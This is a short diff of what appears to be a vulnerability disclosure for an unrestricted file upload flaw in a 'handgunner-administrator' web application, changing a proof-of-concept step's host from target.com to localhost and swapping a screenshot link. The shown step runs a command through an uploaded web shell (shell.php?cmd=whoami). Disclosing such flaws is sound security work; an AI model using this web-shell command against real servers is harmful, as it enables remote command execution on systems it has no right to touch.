@@ -80,10 +80,10 @@ curl -X POST  http://localhost:8081/handgunner-administrator/prod.php?cat=1 \
 **Step 3: Execute commands**
 ```bash
 # Access the uploaded shell
-curl "http://target.com/handgunner-administrator/upload/shell.php?cmd=whoami"
+curl "http://localhost:8081/handgunner-administrator/upload/shell.php?cmd=whoami"
 ```
 
-[![pZUfoMn.png](https://s41.ax1x.com/2026/01/03/pZUfoMn.png)](https://imgchr.com/i/pZUfoMn)
+[![pZUIsfS.png](https://s41.ax1x.com/2026/01/03/pZUIsfS.png)](https://imgchr.com/i/pZUIsfS)
 
 **References**:
 - OWASP Unrestricted File Upload: https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload
